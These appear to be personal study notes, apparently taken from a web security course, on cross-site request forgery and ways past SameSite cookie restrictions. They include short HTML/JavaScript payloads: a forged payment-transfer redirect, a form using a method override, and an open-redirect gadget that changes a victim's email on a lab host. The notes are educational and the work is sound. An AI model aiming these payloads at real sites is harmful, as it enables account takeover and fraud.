[[CSRF]]

TLD (top level domain) = `.com`, `.net`
TLD+1 = `example.com`
Same site = same scheme and same TLD+1
e.g. http://app.example.com and http://intra.example.com

Origin: scheme://app.example.com:443
Site: https://example.com

SameSite levels:
* Strict
* Lax
* None

SameSite=Strict will not send this cookie in any cross-site requests.

SameSite=Lax allows some cross-site requests, but only if both of the conditions are met:
* `GET` method
* Request resulted from a top-level navigation by the user, such as clicking on a link

SameSite=None - no restrictions, browser will send cookies in all requests
When setting a cookie with `SameSite=None`, the website must also include the `Secure` attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS. Otherwise, browsers will reject the cookie and it won't be set.

# Bypass using GET
```html
<script>
document.location = 'https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amount=1000000';
</script>
```

Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, Symfony supports the `_method` parameter in forms, which takes precedence over the normal method for routing purposes:

```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
	<input type="hidden" name="_method" value="_POST_">
	<input type="hidden" name="recipient" value="hacker">
	<input type="hidden" name="amount" value="1000000">
</form>
```

## Bypassing using on-site gadgets
One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters. Example: [[Open redirection]]
It works only with client-side redirects.
Example
```html
<script>
window.location.replace('https://0a45008403ba507480fc087a00de00d7.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=newMail%40gmail.com%26submit=1');
</script>
```

## Bypassing via vulnerable sibling domains
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
#to-be-continued 